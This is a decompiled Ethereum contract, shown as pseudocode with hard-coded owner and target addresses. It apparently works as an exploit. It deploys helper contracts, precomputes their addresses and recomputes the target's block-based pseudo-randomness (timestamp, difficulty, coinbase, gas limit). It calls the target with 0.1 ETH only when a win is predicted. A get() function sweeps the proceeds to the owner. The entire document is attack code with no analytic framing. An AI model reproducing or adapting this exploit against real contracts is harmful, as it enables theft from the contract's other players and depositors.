contract main {




// =====================  Runtime code  =====================


const owner = 0xeb54f65775e6a2a42e243823d86486a64fd1f0d6

const target = 0xdd9fd6b6f8f7ea932997992bbe67eabb3e316f3c


array of address sub_6a11455a;
array of uint8 nonces;
uint256 lastBlock;

function nonces(uint256 arg1) {
    require arg1 < nonces.length
    return uint256(nonces[arg1])
}

function sub_6a11455a(?) {
    require arg1 < sub_6a11455a.length
    return sub_6a11455a[arg1]
}

function lastBlock() {
    return lastBlock
}

function _fallback() payable {
  stop
}

function get() {
    require 0xeb54f65775e6a2a42e243823d86486a64fd1f0d6 == msg.sender
    call 0xeb54f65775e6a2a42e243823d86486a64fd1f0d6 with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function sub_c5263b25(?) {
    idx = 0
    while idx < 20:
        mem[96 len 927] = code.data[1997 len 927]
        create contract with 0 wei
                        code: code.data[1997 len 927]
        if not create.new_address:
            revert with ext_call.return_data[0 len return_data.size]
        sub_6a11455a.length++
        sub_6a11455a[sub_6a11455a.length] = address(create.new_address)
        nonces.length++
        mem[0] = 1
        uint256(nonces[nonces.length]) = 1
        idx = idx + 1
        continue 
}

function letsGo() payable {
    require block.number > lastBlock
    require eth.balance(this.address) >= 10^17
    lastBlock = block.number
    require ext_code.size(0xdd9fd6b6f8f7ea932997992bbe67eabb3e316f3c)
    call 0xdd9fd6b6f8f7ea932997992bbe67eabb3e316f3c.0xd87574e0 with:
         gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_code.size(0xdd9fd6b6f8f7ea932997992bbe67eabb3e316f3c)
    call 0xdd9fd6b6f8f7ea932997992bbe67eabb3e316f3c.0x11a09ae7 with:
         gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] > 11 * 10^17
    mem[128] = address(block.coinbase)
    mem[96] = 20
    mem[64] = 148
    mem[148 len 0] = None
    mem[148 len 20] = address(block.coinbase, 0)
    require block.timestamp
    s = 0
    idx = 0
    while idx < sub_6a11455a.length:
        require idx < nonces.length
        mem[0] = 1
        _76 = mem[64]
        mem[mem[64] + 32] = address(sha3(0, 0, sub_6a11455a[idx], uint8(nonces[idx])))
        _78 = mem[64]
        mem[mem[64]] = 20
        mem[64] = mem[64] + 52
        _79 = mem[_78]
        t = _78 + 32
        u = _76 + 52
        s = mem[_78]
        while s >= 32:
            mem[u] = mem[t]
            t = t + 32
            u = u + 32
            s = s - 32
            continue 
        mem[_76 + floor32(mem[_78]) + 52] = mem[_76 + floor32(mem[_78]) + 52] and 256^(-(mem[_78] % 32) + 32) - 1 or mem[_78 + floor32(mem[_78]) + 32] and !(256^(-(mem[_78] % 32) + 32) - 1)
        require block.timestamp
        _103 = mem[64]
        mem[mem[64] + 32] = block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[mem[64] len _76 + _79 + -mem[64] + 52]) / block.timestamp)
        _104 = mem[64]
        mem[mem[64]] = 32
        mem[64] = mem[64] + 64
        _106 = mem[_104]
        t = _104 + 32
        u = _103 + 64
        s = mem[_104]
        while s >= 32:
            mem[u] = mem[t]
            t = t + 32
            u = u + 32
            s = s - 32
            continue 
        mem[_103 + floor32(mem[_104]) + 64] = mem[_103 + floor32(mem[_104]) + 64] and 256^(-(mem[_104] % 32) + 32) - 1 or mem[_104 + floor32(mem[_104]) + 32] and !(256^(-(mem[_104] % 32) + 32) - 1)
        if sha3(mem[_103 + 64 len _106]) % 1000 >= ext_call.return_data[0]:
            s = sha3(mem[_103 + 64 len _106])
            idx = idx + 1
            continue 
        require idx < sub_6a11455a.length
        require ext_code.size(sub_6a11455a[idx])
        call sub_6a11455a[idx].0x1058bec8 with:
           value 10^17 wei
             gas gas_remaining wei
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require idx < nonces.length
        uint256(nonces[idx])++
}



}
